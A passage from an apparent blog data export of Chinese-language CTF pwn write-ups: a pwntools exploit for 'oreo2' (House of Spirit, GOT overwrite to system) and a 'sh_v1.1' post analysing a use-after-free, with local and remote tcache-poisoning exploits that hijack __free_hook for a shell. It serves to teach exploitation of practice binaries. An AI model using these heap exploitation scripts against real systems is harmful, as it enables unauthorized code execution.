class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./oreo2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc-2.23.so&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&quot;./oreo2&quot;</span>,stdin=PTY)<span class=\"comment\">#有了这个才行</span></span><br><span class=\"line\"><span class=\"comment\">#By default, a pipe is used. A pty can be used instead by setting this to PTY</span></span><br><span class=\"line\"><span class=\"comment\">#默认情况下通过管道输入，让stdin=PTY可以使用一个伪终端输入，借此可以recv()更多？</span></span><br><span class=\"line\"><span class=\"comment\">#不加stdin=PTY只能recv()到Exit!\\n</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">name, descr</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;description: &quot;</span> )</span><br><span class=\"line\">\tp.sendline(descr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show_rifles</span>():</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;order: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(message)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>():</span><br><span class=\"line\">\tgdb.attach(p)</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(hex(elf.got[&#x27;puts&#x27;]))</span></span><br><span class=\"line\">sscanf=<span class=\"number\">0x0804A258</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leak libc</span></span><br><span class=\"line\">payload1=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1b</span>+p32(sscanf-<span class=\"number\">0x19</span>)</span><br><span class=\"line\">add(payload1,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">show_rifles()</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(u32(p.recv(4)))</span></span><br><span class=\"line\">libcbase=u32(p.recv(<span class=\"number\">4</span>))-libc.sym[<span class=\"string\">&#x27;__isoc99_sscanf&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*]libcbase: &#123;:&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libcbase)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#use House of Spirit to overwrite notice</span></span><br><span class=\"line\"></span><br><span class=\"line\">fake_chunk=<span class=\"number\">0x0804A2A0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x40</span>-<span class=\"number\">1</span>):<span class=\"comment\">#add count</span></span><br><span class=\"line\">\tadd(<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x1b</span>+p32(fake_chunk+<span class=\"number\">0x8</span>)</span><br><span class=\"line\">add(payload2,<span class=\"string\">&#x27;a1ph0nse&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">msg=<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x24</span>+p32(<span class=\"number\">0x41</span>)</span><br><span class=\"line\">leave(msg)<span class=\"comment\">#overwrite the next chunk of fake chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">free()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">&#x27;asd&#x27;</span>,p32(elf.got[<span class=\"string\">&#x27;__isoc99_sscanf&#x27;</span>]))<span class=\"comment\">#malloc fake chunk and overwrite __isoc99_scanf</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\">msg2=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">leave(p32(msg2))<span class=\"comment\">#overwrite __isoc00_scanf to system</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"pwnable_start","date":"2023-03-12T15:14:01.000Z","_content":"\n感觉是一个有问题的shell，应该是UAF。\n\n<!--more-->\n\n64位保护全开，写的是一个shell。\n\n输入以空格`' '`分割三个参数，存储在bss段中处理。\n\n代码有很多干扰\n\n```c\n__int64 func()\n{\n  int i; // [rsp+8h] [rbp-8h]\n  int j; // [rsp+8h] [rbp-8h]\n  int k; // [rsp+8h] [rbp-8h]\n  int ii; // [rsp+8h] [rbp-8h]\n  int jj; // [rsp+8h] [rbp-8h]\n  int kk; // [rsp+8h] [rbp-8h]\n  int m; // [rsp+Ch] [rbp-4h]\n  int n; // [rsp+Ch] [rbp-4h]\n  int mm; // [rsp+Ch] [rbp-4h]\n\n  if ( !parameter1[0] )                         // 如果参数1为空则进入\n  {\n    puts(\"command is NULL!!!\");\n    return 0LL;\n  }\n  if ( !strcmp(parameter1, \"ls\") )              // 如果参数1是ls\n  {\n    for ( i = 0; i <= 79; ++i )                 // 输入一个列表\n    {\n      if ( *(&file_flag + 6 * i) == 1LL )       // *(base+6*i)==1则输出\n        printf(\"%s \", &file_flag + 48 * i + 8); // 输入base+48*i+8指向的内容\n    }\n    putchar('\\n');                              // 输出'\\n'\n    return 0LL;\n  }\n    \n  if ( !strcmp(parameter1, \"cat\") )             // cat指令\n  {\n    if ( parameter2[0] )                        // 如果第二个参数有内容\n    {\n      for ( j = 0; j <= 79; ++j )\n      {\n        if ( !strcmp(parameter2, &file_flag + 48 * j + 8) )// base+48*j+8处的内容与参数2相同\n        {\n          if ( *(&file_flag + 6 * j) == 1LL )   // base+6*j指向内容为1，否则说明no file\n          {\n            puts(file_data[6 * j]);             // 输出base2+6*i处的qword\n            return 0LL;\n          }\nLABEL_223:\n          puts(\"NO FILE\");\n          return 0LL;\n        }\n      }\n      goto LABEL_223;\n    }                                           // no file\n    goto LABEL_711;\n  }                                             // filename is null\n    \n  if ( !strcmp(parameter1, \"touch\") )           // touch指令\n  {\n\n    if ( parameter2[0] )                        // 第二个参数有值\n    {\n      for ( k = 0; k <= 79; ++k )\n      {\n        if ( !*(&file_flag + 6 * k) )           // 如果原本为空\n        {\n          *(&file_flag + 6 * k) = 1LL;          // 使*(base+6*k)=1,表示有文件\n          file_data[6 * k] = malloc(0x208uLL);\n          read_buf(file_data[6 * k], 0x208uLL); // 读入文件内容\n          strcpy(&file_flag + 48 * k + 8, parameter2);// 将参数2的内容(file name)复制到file_flag+48*k+8\n          return 0LL;\n        }\n      }\nLABEL_807:\n      puts(\"Maximum number of files. Please delete the file.\");// 文件最多80个\n      return 0LL;\n    }\nLABEL_711:\n    puts(\"file_name is NULL\");                  // 第二个参数是filename\n    return 0LL;\n  }\n    \n  if ( !strcmp(parameter1, \"cp\") )              // 复制\n  {\n    if ( !parameter2[0] || !parameter3[0] )     // filename为空\n      goto LABEL_711;\n    if ( !strcmp(parameter2, &file_flag + 8) && file_flag == 1LL )// 第1个file存在且filename与参数2相同\n    {\n      for ( m = 0; m <= 79; ++m )\n      {\n        if ( !strcmp(parameter3, &file_flag + 48 * m + 8) )// 存在一个filename与参数3相同\n        {\n          strncpy(file_data[6 * m], file_data[0], 0x208uLL);// 复制文件内容，第1个到第m个\n          return 0LL;\n        }\n      }\n      for ( n = 0; ; ++n )                      //没有同名的file,检查有没有空余位置,有则复制到新文件\n      {\n        if ( n > 79 )                           // 文件太多\n          goto LABEL_807;\n        if ( !*(&file_flag + 6 * n) )\n          break;\n      }\n      *(&file_flag + 6 * n) = 1LL;              // 写入标志位\n      file_data[6 * n] = malloc(0x208uLL);\t\t// 分配data的空间\n      strcpy(&file_flag + 48 * n + 8, parameter3); // 复制第三个参数到filename\n      strncpy(file_data[6 * n], file_data[0], 0x208uLL); // 复制data\n      return 0LL;\n    }\n    goto LABEL_840; \t\t\t\t\t\t\t// 文件不存在\n  }\n    \n  if ( !strcmp(parameter1, \"gedit\") )\t\t\t// gedit指令\n  {\n    if ( !parameter2[0] )\t\t\t\t\t\t// 文件名为null\n      goto LABEL_711;\n    for ( ii = 0; ; ++ii )\t\t\t\t\t\t\n    {\n      if ( ii > 79 )\n        goto LABEL_840;\t\t\t\t\t\t\t// 文件不存在\n      if ( !strcmp(parameter2, &file_flag + 48 * ii + 8) ) // 比较参数二和文件名\n        break;\n    }\n    if ( *(&file_flag + 6 * ii) == 1LL )\t\t\t\t// 文件已经存在\n    {\n      read_buf(file_data[6 * ii], 0x200uLL);\t\t\t// 写入0x200byte的data\n      return 0LL;\n    }\n    goto LABEL_840;\t\t\t\t\t\t\t\t// 文件不存在\n  }\n    \n  if ( !strcmp(parameter1, \"rm\") )\t\t\t\t// 删除\n  {\n    if ( !parameter2[0] )\t\t\t\t\t\t// 文件名为null\n    {\n      goto LABEL_711;\n    }\n    for ( jj = 0; ; ++jj )\n    {\n      if ( jj > 79 )\n        goto LABEL_840;\t\t\t\t\t\t// 文件不存在\n      if ( !strcmp(parameter2, &file_flag + 48 * jj + 8) ) // 比较参数二和文件名\n        break;\n    }\n    if ( *(&file_flag + 6 * jj) == 1LL ) // 文件已经存在\n    {\n      free(file_data[6 * jj]); \t\t\t// free并赋0\n      file_data[6 * jj] = 0LL;\n      *(&file_flag + 6 * jj) = 0LL;\t\t// 清空标志位\n      return 0LL;\t\t\t\t\t  // 文件名没管，不知道有无影响\n    }\n    goto LABEL_840;\t\t\t\t\t\t// 文件不存在\n  }\n    \n  if ( strcmp(parameter1, \"ln\") )\t\t\t\t\t\t\t// ln指令\n    return 0LL;\n  if ( !parameter2[0] )\t\t\t\t\t\t\t\t\t// 文件名为null\n    goto LABEL_711;\n  if ( !parameter3[0] )\t\t\t\t\t\t\t\t\t// 文件名为null\n    goto LABEL_711;\n  for ( kk = 0; ; ++kk )\n  {\n    if ( kk > 79 )\n    {\n      goto LABEL_840;\t\t\t\t\t\t\t\t\t// 文件不存在\n    }\n    if ( !strcmp(parameter2, &file_flag + 48 * kk + 8) )\t// 找参数二对应的文件名\n      break;\n  }\n  if ( *(&file_flag + 6 * kk) != 1LL )\t\t\t\t// 标志位为0\n  {\nLABEL_840:\n    printf(\"file:%s is not exist;\", parameter2);\t// 文件不存在\n    return 0LL;\n  }\n  for ( mm = 0; ; ++mm )\n  {\n    if ( mm > 79 )\n      goto LABEL_807;\t\t\t\t\t\t\t\t// 文件太多了\n    if ( !*(&file_flag + 6 * mm) )\t\t\t\t\t// 找到一个空位\n      break;\n  }\n  strcpy(&file_flag + 48 * mm + 8, parameter3);\t\t// 复制第三个参数到file name\n  *(&file_flag + 6 * mm) = 1LL;\t\t\t\t\t// 标志位设1\n  file_data[6 * mm] = file_data[6 * kk];\t\t// copy data,从p2到p3\n  return 0LL;\n}\n```\n\n由上可以大概看出这个shell的功能：\n\n```\nls: 输出所有flag为1的filename\ncat p2: 输出p2指定filename的filedata \ntouch p2: 创建p2指定filename的文件，并输入文件内容(最大0x208byte) \ncp p2 p3: 将名为p2的file复制到名为p3的file中，若不存在名为p3的文件则新建，p2必须是第一个文件的文件名 \ngedit p2: 修改名为p2的file的内容(最多0x200byte)\nrm p2: 删除名为p2的file，对标志位和chunk指针赋0\nln p2 p3: 将名为p2的file的filedata复制到一个新的名为p3的file中 (复制chunk指针)\n\nfiledata_base: 0xa0e8 qword[6*i] 一个0x208byte\nfileflag_base: 0xa0c0 \nfileflag_base+6*i: flag,==1表示文件存在，==0表示文件不存在\nfileflag_base+48*i+8: filaname\n```\n\n可以看到存在UAF：ln可将同一个`chunk`指针挂载到多个`file`中，但`rm`删除是按照`filename`删除一个`file`，仍可通过其他`file`控制该`chunk`指针。\n\n如果这样的话首先利用`unsorted bin`泄露出堆指针和libcbase， 之后利用`UAF`走`tcache poison`劫持`free_hook`来`get shell`。\n\n本地还能用下`one_gadget`，远程估计只能通过`malloc_hook`用'LibcSearcher'搜`libc`，之后走`system(\"\"/bin/sh\\x00\")`。\n\n本地exp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='sh_v1.1'\nelf=ELF('./'+filename)\n# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')\nlibc=ELF('./libc-2.31.so')\np=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('121.40.89.206',34883)\n\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef ls():\n  ru('>>>>')\n  sl('ls')\n  return ru('\\n')\n\ndef cat(filename):\n  ru('>>>>')\n  sl('cat '+str(filename))\n\ndef touch(filename,filedata):\n  ru('>>>>')\n  sl('touch '+str(filename))\n  sl(str(filedata))\n\ndef gedit(filename,filedata):\n  ru('>>>>')\n  sl('gedit '+str(filename))\n  sl(str(filedata))\n\ndef rm(filename):\n  ru('>>>>')\n  sl('rm '+str(filename))\n\ndef ln(src,dest):\n  ru('>>>>')\n  sl('ln '+str(src)+' '+str(dest))\n\n\n# fill in tcache\n# file0 --> file6\nfor i in range(7):\n  touch('file'+str(i),'aaaaaaaa')\n\n# use to leak libc\n# file7 == file8\ntouch('file7','bbbbbbbb')\nln('file7','file8')\ntouch('file9','cccccccc') # escape for being combined into top chunk\n# use to leak heap\n# file1 == file10\nln('file1','file10')\n\n# fill in tcache\nfor i in range(7):\n  rm('file'+str(i))\n\n# leak libc\nrm('file7')\n# debug()\ncat('file8')\nlibc_addr=uu64(ru('\\n')[:-1])\nmalloc_hook=libc_addr-96-0x10\nlibcbase=malloc_hook-libc.sym['__malloc_hook']\nfree_hook=libcbase+libc.sym['__free_hook']\nsys_addr=libcbase+libc.sym['system']\n\n# leak heap addr\ncat('file10')\nheapbase=uu64(ru('\\n')[:-1])-0x2a0\n\n# overwrite free hook\npayload=p64(free_hook)\npayload=payload.ljust(0x20,b'\\x00')\n  \ngedit('file10',payload)\n\n# get tcache\nfor i in range(6):\n  touch('file'+str(11+i),'aaaaaaaa')\n\nleak('sys_addr',hex(sys_addr))\nleak('malloc_hook',hex(malloc_hook))\nleak('free_hook',hex(free_hook))\nleak('libcbase',hex(libcbase))\nleak('heapbase',hex(heapbase))\n# debug()\n\n# get free_hook\npayload=p64(sys_addr)\ntouch('file17',payload)\n\ntouch('file18','/bin/sh\\x00')\n# debug()\nrm('file18')\n\nitr()\n\n```\n\n远程exp:\n\n```py\nfrom pwn import*\nfrom LibcSearcher import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='sh_v1.1'\nelf=ELF('./'+filename)\n# libc=ELF('./libc-2.31.so')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('121.40.89.206',34883)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef ls():\n  ru('>>>>')\n  sl('ls')\n  return ru('\\n')\n\ndef cat(filename):\n  ru('>>>>')\n  sl('cat '+str(filename))\n\ndef touch(filename,filedata):\n  ru('>>>>')\n  sl('touch '+str(filename))\n  sl(str(filedata))\n\ndef gedit(filename,filedata):\n  ru('>>>>')\n  sl('gedit '+str(filename))\n  sl(str(filedata))\n\ndef rm(filename):\n  ru('>>>>')\n  sl('rm '+str(filename))\n\ndef ln(src,dest):\n  ru('>>>>')\n  sl('ln '+str(src)+' '+str(dest))\n\n\n# fill in tcache\n# file0 --> file6\nfor i in range(7):\n  touch('file'+str(i),'aaaaaaaa')\n\n# use to leak libc\n# file7 == file8\ntouch('file7','bbbbbbbb')\nln('file7','file8')\ntouch('file9','cccccccc') # escape for being combined into top chunk\n# use to leak heap\n# file1 == file10\nln('file1','file10')\n\n# fill in tcache\nfor i in range(7):\n  rm('file'+str(i))\n\n# leak libc\nrm('file7')\n# debug()\ncat('file8')\nlibc_addr=uu64(ru('\\n')[:-1])\nmalloc_hook=libc_addr-96-0x10\n\n# leak heap addr\ncat('file10')\nheapbase=uu64(ru('\\n')[:-1])-0x2a0\n\n\nlibc=LibcSearcher('__malloc_hook',malloc_hook)\nlibcbase=malloc_hook-libc.dump('__malloc_hook')\nfree_hook=libcbase+libc.dump('__free_hook')\nsys_addr=libcbase+libc.dump('system')\n\nleak('sys_addr',hex(sys_addr))\nleak('malloc_hook',hex(malloc_hook))\nleak('free_hook',hex(free_hook))\nleak('libcbase',hex(libcbase))\nleak('heapbase',hex(heapbase))\n\n# overwrite free_hook\npayload=p64(free_hook)\npayload=payload.ljust(0x20,b'\\x00')\n  \ngedit('file10',payload)\n\n# get tcache\nfor i in range(6):\n  touch('file'+str(11+i),'aaaaaaaa')\n\n# debug()\n\n# get free_hook\npayload=p64(sys_addr)\ntouch('file17',payload)\n\n# get shell\ntouch('file18',b'/bin/sh\\x00')\nrm('file18')\n\nitr()\n\n```\n\n","source":"_posts/pwnhub_sh_v1.1.md","raw":"---\ntitle: pwnable_start\ndate: 2023-03-12 23:14:01\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n\n\n\n---\n\n感觉是一个有问题的shell，应该是UAF。\n\n<!--more-->\n\n64位保护全开，写的是一个shell。\n\n输入以空格`' '`分割三个参数，存储在bss段中处理。\n\n代码有很多干扰\n\n```c\n__int64 func()\n{\n  int i; // [rsp+8h] [rbp-8h]\n  int j; // [rsp+8h] [rbp-8h]\n  int k; // [rsp+8h] [rbp-8h]\n  int ii; // [rsp+8h] [rbp-8h]\n  int jj; // [rsp+8h] [rbp-8h]\n  int kk; // [rsp+8h] [rbp-8h]\n  int m; // [rsp+Ch] [rbp-4h]\n  int n; // [rsp+Ch] [rbp-4h]\n  int mm; // [rsp+Ch] [rbp-4h]\n\n  if ( !parameter1[0] )                         // 如果参数1为空则进入\n  {\n    puts(\"command is NULL!!!\");\n    return 0LL;\n  }\n  if ( !strcmp(parameter1, \"ls\") )              // 如果参数1是ls\n  {\n    for ( i = 0; i <= 79; ++i )                 // 输入一个列表\n    {\n      if ( *(&file_flag + 6 * i) == 1LL )       // *(base+6*i)==1则输出\n        printf(\"%s \", &file_flag + 48 * i + 8); // 输入base+48*i+8指向的内容\n    }\n    putchar('\\n');                              // 输出'\\n'\n    return 0LL;\n  }\n    \n  if ( !strcmp(parameter1, \"cat\") )             // cat指令\n  {\n    if ( parameter2[0] )                        // 如果第二个参数有内容\n    {\n      for ( j = 0; j <= 79; ++j )\n      {\n        if ( !strcmp(parameter2, &file_flag + 48 * j + 8) )// base+48*j+8处的内容与参数2相同\n        {\n          if ( *(&file_flag + 6 * j) == 1LL )   // base+6*j指向内容为1，否则说明no file\n          {\n            puts(file_data[6 * j]);             // 输出base2+6*i处的qword\n            return 0LL;\n          }\nLABEL_223:\n          puts(\"NO FILE\");\n          return 0LL;\n        }\n      }\n      goto LABEL_223;\n    }                                           // no file\n    goto LABEL_711;\n  }                                             // filename is null\n    \n  if ( !strcmp(parameter1, \"touch\") )           // touch指令\n  {\n\n    if ( parameter2[0] )                        // 第二个参数有值\n    {\n      for ( k = 0; k <= 79; ++k )\n      {\n        if ( !*(&file_flag + 6 * k) )           // 如果原本为空\n        {\n          *(&file_flag + 6 * k) = 1LL;          // 使*(base+6*k)=1,表示有文件\n          file_data[6 * k] = malloc(0x208uLL);\n          read_buf(file_data[6 * k], 0x208uLL); // 读入文件内容\n          strcpy(&file_flag + 48 * k + 8, parameter2);// 将参数2的内容(file name)复制到file_flag+48*k+8\n          return 0LL;\n        }\n      }\nLABEL_807:\n      puts(\"Maximum number of files. Please delete the file.\");// 文件最多80个\n      return 0LL;\n    }\nLABEL_711:\n    puts(\"file_name is NULL\");                  // 第二个参数是filename\n    return 0LL;\n  }\n    \n  if ( !strcmp(parameter1, \"cp\") )              // 复制\n  {\n    if ( !parameter2[0] || !parameter3[0] )     // filename为空\n      goto LABEL_711;\n    if ( !strcmp(parameter2, &file_flag + 8) && file_flag == 1LL )// 第1个file存在且filename与参数2相同\n    {\n      for ( m = 0; m <= 79; ++m )\n      {\n        if ( !strcmp(parameter3, &file_flag + 48 * m + 8) )// 存在一个filename与参数3相同\n        {\n          strncpy(file_data[6 * m], file_data[0], 0x208uLL);// 复制文件内容，第1个到第m个\n          return 0LL;\n        }\n      }\n      for ( n = 0; ; ++n )                      //没有同名的file,检查有没有空余位置,有则复制到新文件\n      {\n        if ( n > 79 )                           // 文件太多\n          goto LABEL_807;\n        if ( !*(&file_flag + 6 * n) )\n          break;\n      }\n      *(&file_flag + 6 * n) = 1LL;              // 写入标志位\n      file_data[6 * n] = malloc(0x208uLL);\t\t// 分配data的空间\n      strcpy(&file_flag + 48 * n + 8, parameter3); // 复制第三个参数到filename\n      strncpy(file_data[6 * n], file_data[0], 0x208uLL); // 复制data\n      return 0LL;\n    }\n    goto LABEL_840; \t\t\t\t\t\t\t// 文件不存在\n  }\n    \n  if ( !strcmp(parameter1, \"gedit\") )\t\t\t// gedit指令\n  {\n    if ( !parameter2[0] )\t\t\t\t\t\t// 文件名为null\n      goto LABEL_711;\n    for ( ii = 0; ; ++ii )\t\t\t\t\t\t\n    {\n      if ( ii > 79 )\n        goto LABEL_840;\t\t\t\t\t\t\t// 文件不存在\n      if ( !strcmp(parameter2, &file_flag + 48 * ii + 8) ) // 比较参数二和文件名\n        break;\n    }\n    if ( *(&file_flag + 6 * ii) == 1LL )\t\t\t\t// 文件已经存在\n    {\n      read_buf(file_data[6 * ii], 0x200uLL);\t\t\t// 写入0x200byte的data\n      return 0LL;\n    }\n    goto LABEL_840;\t\t\t\t\t\t\t\t// 文件不存在\n  }\n    \n  if ( !strcmp(parameter1, \"rm\") )\t\t\t\t// 删除\n  {\n    if ( !parameter2[0] )\t\t\t\t\t\t// 文件名为null\n    {\n      goto LABEL_711;\n    }\n    for ( jj = 0; ; ++jj )\n    {\n      if ( jj > 79 )\n        goto LABEL_840;\t\t\t\t\t\t// 文件不存在\n      if ( !strcmp(parameter2, &file_flag + 48 * jj + 8) ) // 比较参数二和文件名\n        break;\n    }\n    if ( *(&file_flag + 6 * jj) == 1LL ) // 文件已经存在\n    {\n      free(file_data[6 * jj]); \t\t\t// free并赋0\n      file_data[6 * jj] = 0LL;\n      *(&file_flag + 6 * jj) = 0LL;\t\t// 清空标志位\n      return 0LL;\t\t\t\t\t  // 文件名没管，不知道有无影响\n    }\n    goto LABEL_840;\t\t\t\t\t\t// 文件不存在\n  }\n    \n  if ( strcmp(parameter1, \"ln\") )\t\t\t\t\t\t\t// ln指令\n    return 0LL;\n  if ( !parameter2[0] )\t\t\t\t\t\t\t\t\t// 文件名为null\n    goto LABEL_711;\n  if ( !parameter3[0] )\t\t\t\t\t\t\t\t\t// 文件名为null\n    goto LABEL_711;\n  for ( kk = 0; ; ++kk )\n  {\n    if ( kk > 79 )\n    {\n      goto LABEL_840;\t\t\t\t\t\t\t\t\t// 文件不存在\n    }\n    if ( !strcmp(parameter2, &file_flag + 48 * kk + 8) )\t// 找参数二对应的文件名\n      break;\n  }\n  if ( *(&file_flag + 6 * kk) != 1LL )\t\t\t\t// 标志位为0\n  {\nLABEL_840:\n    printf(\"file:%s is not exist;\", parameter2);\t// 文件不存在\n    return 0LL;\n  }\n  for ( mm = 0; ; ++mm )\n  {\n    if ( mm > 79 )\n      goto LABEL_807;\t\t\t\t\t\t\t\t// 文件太多了\n    if ( !*(&file_flag + 6 * mm) )\t\t\t\t\t// 找到一个空位\n      break;\n  }\n  strcpy(&file_flag + 48 * mm + 8, parameter3);\t\t// 复制第三个参数到file name\n  *(&file_flag + 6 * mm) = 1LL;\t\t\t\t\t// 标志位设1\n  file_data[6 * mm] = file_data[6 * kk];\t\t// copy data,从p2到p3\n  return 0LL;\n}\n```\n\n由上可以大概看出这个shell的功能：\n\n```\nls: 输出所有flag为1的filename\ncat p2: 输出p2指定filename的filedata \ntouch p2: 创建p2指定filename的文件，并输入文件内容(最大0x208byte) \ncp p2 p3: 将名为p2的file复制到名为p3的file中，若不存在名为p3的文件则新建，p2必须是第一个文件的文件名 \ngedit p2: 修改名为p2的file的内容(最多0x200byte)\nrm p2: 删除名为p2的file，对标志位和chunk指针赋0\nln p2 p3: 将名为p2的file的filedata复制到一个新的名为p3的file中 (复制chunk指针)\n\nfiledata_base: 0xa0e8 qword[6*i] 一个0x208byte\nfileflag_base: 0xa0c0 \nfileflag_base+6*i: flag,==1表示文件存在，==0表示文件不存在\nfileflag_base+48*i+8: filaname\n```\n\n可以看到存在UAF：ln可将同一个`chunk`指针挂载到多个`file`中，但`rm`删除是按照`filename`删除一个`file`，仍可通过其他`file`控制该`chunk`指针。\n\n如果这样的话首先利用`unsorted bin`泄露出堆指针和libcbase， 之后利用`UAF`走`tcache poison`劫持`free_hook`来`get shell`。\n\n本地还能用下`one_gadget`，远程估计只能通过`malloc_hook`用'LibcSearcher'搜`libc`，之后走`system(\"\"/bin/sh\\x00\")`。\n\n本地exp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='sh_v1.1'\nelf=ELF('./'+filename)\n# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')\nlibc=ELF('./libc-2.31.so')\np=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('121.40.89.206',34883)\n\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef ls():\n  ru('>>>>')\n  sl('ls')\n  return ru('\\n')\n\ndef cat(filename):\n  ru('>>>>')\n  sl('cat '+str(filename))\n\ndef touch(filename,filedata):\n  ru('>>>>')\n  